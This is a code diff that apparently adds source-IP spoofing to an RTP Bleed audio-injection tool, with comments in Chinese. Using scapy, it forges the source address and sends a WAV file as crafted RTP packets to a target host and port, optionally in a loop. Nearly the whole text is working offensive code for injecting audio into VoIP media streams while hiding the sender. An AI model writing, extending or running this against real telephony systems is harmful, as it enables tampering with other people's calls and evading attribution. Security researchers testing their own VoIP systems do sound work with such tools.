@@ -14,6 +14,14 @@ import time
 import platform
 from .lib.color import Color
 from .lib.logos import Logo
+# 导入IP伪造所需的模块
+try:
+    from scapy.all import IP, UDP, Raw, send
+    from scapy.arch import get_windows_if_list  # Windows系统
+    from scapy.arch import get_if_list          # Linux系统
+    SCAPY_AVAILABLE = True
+except ImportError:
+    SCAPY_AVAILABLE = False
 
 # RTP负载类型定义
 RTP_PAYLOAD_TYPES = {
@@ -51,6 +59,8 @@ class RTPBleedInject:
         self.file = "test.wav"
         self.loop = False
         self.force = False
+        self.spoof_ip = ""  # 添加伪造IP地址属性
+        self.use_scapy = False  # 是否使用Scapy发送数据包
 
         self.run = True
 
@@ -65,6 +75,38 @@ class RTPBleedInject:
         # 获取负载类型的数值
         payload_value = RTP_PAYLOAD_TYPES[self.payload]
 
+        # 检查是否使用IP伪造
+        if self.spoof_ip and self.spoof_ip != "":
+            if not SCAPY_AVAILABLE:
+                print(f"{self.c.BRED}[!] IP spoofing requires scapy module. Please install it with 'pip install scapy'{self.c.WHITE}")
+                print(self.c.WHITE)
+                sys.exit(1)
+            self.use_scapy = True
+            # 获取可用网络接口
+            try:
+                if platform.system() == "Windows":
+                    interfaces = get_windows_if_list()
+                    # 选择第一个活跃的接口
+                    for iface in interfaces:
+                        if iface.get('name').startswith('以太网') or iface.get('name').startswith('Ethernet'):
+                            self.active_iface = iface.get('name')
+                            break
+                    if not self.active_iface and interfaces:
+                        self.active_iface = interfaces[0].get('name')
+                else:
+                    # Linux系统
+                    interfaces = get_if_list()
+                    self.active_iface = interfaces[0] if interfaces else None
+                
+                if self.active_iface:
+                    print(f"{self.c.BWHITE}[✓] Using network interface: {self.c.GREEN}{self.active_iface}")
+                else:
+                    print(f"{self.c.BRED}[!] No suitable network interface found for IP spoofing")
+                    self.use_scapy = False
+            except Exception as e:
+                print(f"{self.c.BRED}[!] Error setting up network interface: {str(e)}")
+                self.use_scapy = False
+
         logo = Logo("rtpbleedinject")
         logo.print()
 
@@ -75,6 +117,8 @@ class RTPBleedInject:
         print(f"{self.c.BWHITE}[✓] Payload type: {self.c.YELLOW}{self.payload}")
         print(f"{self.c.BWHITE}[✓] WAV file {self.c.YELLOW}{self.file}")
         print(f"{self.c.BWHITE}[✓] Loop mode: {self.c.YELLOW}{'Enabled' if self.loop else 'Disabled'}")
+        if self.use_scapy:
+            print(f"{self.c.BWHITE}[✓] IP spoofing: {self.c.YELLOW}{self.spoof_ip}")
         print(self.c.WHITE)
 
         print(f"{self.c.YELLOW}[+] Reading WAV file ...{self.c.WHITE}")
@@ -91,6 +135,15 @@ class RTPBleedInject:
             print(self.c.WHITE)
             exit()
 
+        # 如果使用Scapy发送伪造IP的数据包
+        if self.use_scapy:
+            self.start_with_spoofed_ip(data, payload_value)
+        else:
+            # 原始Socket发送方式
+            self.start_with_socket(data, payload_value)
+
+    def start_with_socket(self, data, payload_value):
+        """使用普通Socket发送数据包"""
         # Create a UDP socket
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -231,3 +284,101 @@ class RTPBleedInject:
 
         print(f"\n{self.c.YELLOW}[+] Closing connection...{self.c.WHITE}")
         sock.close()
+
+    def start_with_spoofed_ip(self, data, payload_value):
+        """使用伪造IP发送数据包"""
+        host = (str(self.ip), self.port)
+        nloop = 0
+        
+        # 由于无法接收响应，所以直接使用强制模式
+        print(f"{self.c.YELLOW}[+] Using IP spoofing with forced mode enabled{self.c.WHITE}")
+        
+        # 生成初始RTP头部信息
+        nloop = 1
+        cloop = hex(nloop)[2:]
+        cloop = cloop.zfill(4)
+        cpayload = "%s" % hex(0x80 | payload_value & 0x7F)[2:]
+        
+        # 自己生成序列号和时间戳
+        seq = "0001"  # 起始序列号为1
+        timestamp = "00000000"  # 起始时间戳为0
+        ssrc = "12345678"  # 随机SSRC值
+        version = "80" + cpayload
+        
+        print(f"{self.c.YELLOW}[+] Starting RTP injection with spoofed IP {self.spoof_ip}{self.c.WHITE}")
+        print(f"{self.c.BWHITE}[-] Initial Seq: {self.c.GREEN}{seq}")
+        print(f"{self.c.BWHITE}[-] Initial Timestamp: {self.c.GREEN}{timestamp}")
+        print(f"{self.c.BWHITE}[-] SSRC: {self.c.GREEN}{ssrc}")
+        print(f"{self.c.BWHITE}[-] Version: {self.c.GREEN}{version}")
+        
+        total = len(data) * 2
+        cont = 0
+        hexdata = data.hex()
+        size = 160
+        SAMPLE_RATE = 8000  # 标准8kHz采样率
+        SAMPLES_PER_PACKET = size // 1  # 80个采样点
+        
+        print(f"{self.c.YELLOW}[+] Injecting RTP audio with spoofed IP...{self.c.WHITE}")
+        
+        try:
+            while self.run == True:
+                if not self.run:
+                    print(f"\n{self.c.YELLOW}[!] Stopping RTP injection...{self.c.WHITE}")
+                    break
+                
+                packet = hexdata[cont : cont + (size * 2)]
+                
+                nseq = int("%s" % seq, base=16) + 1
+                seq = hex(nseq)[2:].zfill(4)
+                
+                ntimestamp = int("%s" % timestamp, base=16) + SAMPLES_PER_PACKET
+                timestamp = hex(ntimestamp)[2:].zfill(8)
+                
+                print(
+                    f"{self.c.YELLOW}[+] Sending packet {str(cont)} of {str(total)} (version: {version}, seq: {seq}, timestamp: {timestamp}, ssrc: {ssrc})",
+                    end="\r",
+                )
+                
+                # 构建RTP包
+                packet_bytes = "%s%s%s%s%s" % (
+                    version,
+                    seq,
+                    timestamp,
+                    ssrc,
+                    packet,
+                )
+                byte_array = bytearray.fromhex(packet_bytes)
+                
+                # 使用Scapy发送伪造IP数据包
+                try:
+                    # 构建数据包
+                    scapy_packet = IP(src=self.spoof_ip, dst=self.ip) / \
+                                  UDP(sport=10000, dport=self.port) / \
+                                  Raw(load=byte_array)
+                    
+                    # 发送数据包
+                    send(scapy_packet, verbose=0, iface=self.active_iface)
+                    time.sleep(SAMPLES_PER_PACKET / SAMPLE_RATE)
+                except Exception as e:
+                    print(f"\n{self.c.RED}[!] Error sending packet: {e}{self.c.WHITE}")
+                    self.run = False
+                    break
+                
+                cont += size * 2
+                
+                # 如果到达文件末尾且启用了循环模式，则重置计数器继续发送
+                if cont >= total:
+                    if self.loop:
+                        print(f"\n{self.c.YELLOW}[+] Restarting audio file...{self.c.WHITE}")
+                        cont = 0
+                    else:
+                        break
+                        
+        except KeyboardInterrupt:
+            print(f"\n{self.c.YELLOW}[!] Keyboard interrupt received{self.c.WHITE}")
+            self.run = False
+        except Exception as e:
+            print(f"{self.c.YELLOW}[+] Exception: {e}{self.c.WHITE}")
+            pass
+            
+        print(f"\n{self.c.YELLOW}[+] Finished sending RTP audio with spoofed IP{self.c.WHITE}")
